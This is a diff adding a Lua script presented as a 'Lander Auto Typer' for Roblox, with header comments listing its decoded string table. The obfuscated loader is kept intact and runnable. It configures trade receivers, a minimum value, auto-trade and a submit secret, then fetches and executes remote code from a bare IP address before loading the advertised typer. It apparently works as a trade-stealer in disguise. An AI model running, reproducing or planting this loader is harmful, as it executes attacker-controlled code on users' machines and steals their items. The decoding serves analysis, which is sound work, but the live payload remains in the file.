@@ -1,0 +1,45 @@
+-- Lander Auto Typer
+-- STATICALLY DEOBFUSCATED / DECODED VERSION
+-- Generated from the exact uploaded source: 0.txt
+--
+-- The custom string table, its three reversals, and the custom 6-bit
+-- decoder have been resolved. Every A(-400xx) lookup in the dispatcher
+-- has been replaced with its decoded plaintext.
+--
+-- The VM/dispatcher itself is preserved because rewriting its state
+-- machine into invented source-level functions would no longer be an
+-- exact deobfuscation of the supplied file.
+--
+-- Decoded references are real plaintext from the supplied decoder.
+
+-- Decoded string table (after the source's three reversals):
+-- 01: 'AUTO_INVITE'
+-- 02: 'game'
+-- 03: 'loadstring'
+-- 04: 'wait'
+-- 05: 'WEBHOOK_POLL_SEC'
+-- 06: 'http://205.185.125.84/sab/sabtrade'
+-- 07: '50m'
+-- 08: 'LINK_ID'
+-- 09: 'unpack'
+-- 10: '__index'
+-- 11: 'HttpGet'
+-- 12: '9Itnx75jEPAyGv'
+-- 13: 'task'
+-- 14: 'getgenv'
+-- 15: '_G'
+-- 16: '_JPOatMvF7Zd9eQ3z-w05DRaBXbqGnv2'
+-- 17: '__gc'
+-- 18: 'LanderAlt00'
+-- 19: 'https://raw.githubusercontent.com/Lander1farm1scripts/Lander-Auto-Code-Typer/refs/heads/main/Lander_Auto_Typer_V3.txt'
+-- 20: 'SUBMIT_SECRET'
+-- 21: 'StarScriptsConfig'
+-- 22: '__len'
+-- 23: 'MIN_VALUE'
+-- 24: 'ENABLE_TRADE'
+-- 25: 'RECEIVERS'
+-- 26: 'TcoAlarmSystemV2'
+-- 27: 'Icc-edFP8AU9OkZThIpYHwPTsJjYqO1cagJF-Y3iteI'
+
+return(function(...)local o={"fTxhRkXMuJf4RTfM";"TkNUfTD+fNe5";"NW61R+XmAzJ5Vu6Fq+J+oC==";"4+6sP+NkfDl7RNTx5c2aNWmeAMDK0JhTAFSi+uMOo+6mqFSWPNk/aufD4R==";"RNNT5Jpe5DqeNET=","qcM2qR==";"BWpmqt6FAzDYqd==","0cMS0l==","NFNg4EpO4JpR5FXouJ6MRd==","atfFAUQ1P/Kd647XnUTYo5KJPsCFPZ6my8p/y+eFAzMkqR==","65h2";"5EDn4Jpefl==","0+xdy+6r","uJpSBzfDVl==";"4tfFAE0D0l==","nTDFBvCZ6+SMTEMxfZy=","0WM/ad==","qcNFqcNY0C==","uFA=";"uFSR5cMF5uqW6JSkn+NfoZQ20/lJfMemRDm8AT0Y0sK=";"uJpvyd==","5WMYqWNjR+XFoUl=","atfFAto3PjpjyuAYqcDFatN80u6DAz61BvfDBvRYycp2PFXmBzfDAsMzyue2ou6sAzDd0to15WMYqWNjPTMJ0Ww2Rcpkq4JTVuhDA8pjq+q/PcmDy+f/PcJma+715WMYqWNjuFMJ0WpbNtDdquebNsoY0tmF","TJNg5TDTuJ6MRJeMNl==";"TZfmAD6sAzDd0t6UBcxza+A=","uJpIq+7=";"5TDnuJqh5MNM"}for A,Q in ipairs({{1;27},{1;23},{24,27}})do while Q[1]<Q[2]do o[Q[1]],o[Q[2]],Q[1],Q[2]=o[Q[2]],o[Q[1]],Q[1]+1,Q[2]-1 end end
+do local A={J=53;j=50;a=26;H=62,Z=55,m=33;f=17;O=15,v=39;["7"]=56;W=6,M=5,["8"]=34,Y=46,k=36;U=3;e=9;p=61;["5"]=19,["/"]=51,["1"]=47;d=48;["6"]=13;s=35;V=30,R=16;["0"]=29,t=7;L=59;G=10;["9"]=63;K=8,B=27,X=49,z=38,n=14;D=37,P=11;["+"]=22;x=57;h=1,T=20,b=31,u=23,o=12,["3"]=58,A=28;w=60;S=41,C=32;["4"]=18,["2"]=45,F=52;E=4;c=54;l=0;y=24;r=43,g=2,q=25,i=42;I=44,N=21,Q=40}local Q=string.len local B=o local k=table.insert local q=math.floor local X=type local D=string.sub local i=string.char local I=table.concat for o=1,#B,1 do local V=B[o]if X(V)=="string"then local X=Q(V)local S={}local N=1 local Y=0 local H=0 while N<=X do local o=D(V,N,N)local Q=A[o]if Q then Y=Y+Q*64^(3-H)H=H+1 if H==4 then H=0 local o=q(Y/65536)local A=q((Y%65536)/256)local Q=Y%256 k(S,i(o,A,Q))Y=0 end elseif o=="="then k(S,i(q(Y/65536)))if N>=X or D(V,N+1,N+1)~="="then k(S,i(q((Y%65536)/256)))end break end N=N+1 end B[o]=I(S)end end end return(function(o,B,k,q,X,D,i,e,V,M,S,Q,N,Y,I,H)e,Y,I,M,H,Q,V,S,N=function(o)V[o]=V[o]-1 if 0==V[o]then V[o],I[o]=nil,nil end end,function(o)for A=1,#o,1 do V[o[A]]=1+V[o[A]]end if k then local Q=k(true)local B=X(Q)B["__index"],B["__gc"],B["__len"]=o,H,function()return 1232436 end return Q else return q({},{["__gc"]=H;["__index"]=o,["__len"]=function()return 1232436 end})end end,{},function(o,A)local B=Y(A)local k=function(...)return Q(o,{...},A,B)end return k end,function(o)local A,Q=1,o[1]while Q do V[Q],A=V[Q]-1,1+A if V[Q]==0 then V[Q],I[Q]=nil,nil end Q=o[A]end end,function(Q,k,q,X)local I,c,l,i,J,K,H,S,P,d,Y,F,e,N,M,f,V while Q do if Q<9184323 then if Q<4372839 then if Q<1823868 then Q=V i=Y Q=Y and 15933201 or 9802941 else I=k S="getgenv"N=o[S]V=Q Q=N and 8900341 or 1564643 Y=N end else S="getgenv"Q=1564643 N=o[S]S=N()Y=S end else if Q<14979313 then Q=15933201 V="_G"Y=o[V]i=Y else e="LINK_ID"l=true f="ENABLE_TRADE"c="SUBMIT_SECRET"P="WEBHOOK_POLL_SEC"F=true S="LanderAlt00"K=2 J="Icc-edFP8AU9OkZThIpYHwPTsJjYqO1cagJF-Y3iteI"Y=i V="RECEIVERS"Q="StarScriptsConfig"M="_JPOatMvF7Zd9eQ3z-w05DRaBXbqGnv2"H="TcoAlarmSystemV2"N={S,H}H="50m"d="AUTO_INVITE"S="MIN_VALUE"i={[V]=N,[S]=H,[e]=M;[c]=J;[P]=K;[f]=l,[d]=F}Y[Q]=i H="HttpGet"i="loadstring"N="game"Q=o[i]S="http://205.185.125.84/sab/sabtrade"V=o[N]H=V[H]N={H(V,S)}V="task"Y=nil i=Q(B(N))Q=i()i=o[V]V="wait"H="HttpGet"Q=i[V]N="game"V=.2 i=Q(V)S="https://raw.githubusercontent.com/Lander1farm1scripts/Lander-Auto-Code-Typer/refs/heads/main/Lander_Auto_Typer_V3.txt"i="loadstring"Q=o[i]V=o[N]H=V[H]N={H(V,S)}i=Q(B(N))Q=i()i={}Q=o["9Itnx75jEPAyGv"]end end end Q=#X return B(i)end,{},function()N=N+1 V[N]=1 return N end,0 return(M(2095638,{}))(B(i))end)(getfenv and getfenv()or _ENV,unpack or table["unpack"],newproxy,setmetatable,getmetatable,select,{...})end)(...)
